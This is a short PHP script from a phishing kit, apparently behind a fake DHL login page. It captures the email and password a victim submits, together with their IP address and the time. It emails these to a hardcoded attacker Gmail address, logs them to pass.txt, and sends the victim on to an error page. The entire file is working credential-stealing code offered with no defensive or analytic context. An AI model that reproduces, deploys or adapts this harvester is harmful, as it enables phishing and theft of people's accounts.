<?php
    if (isset($_POST['email']) && isset($_POST['password'])) {
    	$email = $_POST['email'];
    	$password = $_POST['password'];
$data ='------=====I JUST HACKED YOU========--------'."\n";

//$data .=$_POST['']."\n";
$data .='Email='.""; $data .= $email."\n";
$data .='Password='.""; $data .= $password."\n";
$data .='IP='.""; $data .= $_SERVER["REMOTE_ADDR"]."\n";
$data .='Date='.""; $data .= date("m/d/y G.i:s", time())."\n";
//$data .=$_POST['']."\n";


$file ="pass.txt";

$to="dianaedna101@gmail.com";
$subject = "New DHL Log";
$headers = "From: Hephzibar Logins<new@mail.com>\n";
$headers .= "MIME-Version: 1.0\n";
mail($to,$subject,$data,$headers);

header("Location: ./error.html");


$fp = fopen($file, "a") or die("Couldn't open $file for writing!");
fwrite($fp, $data) or die("Couldn't write values to file!");
fclose($fp);
    }



    ?>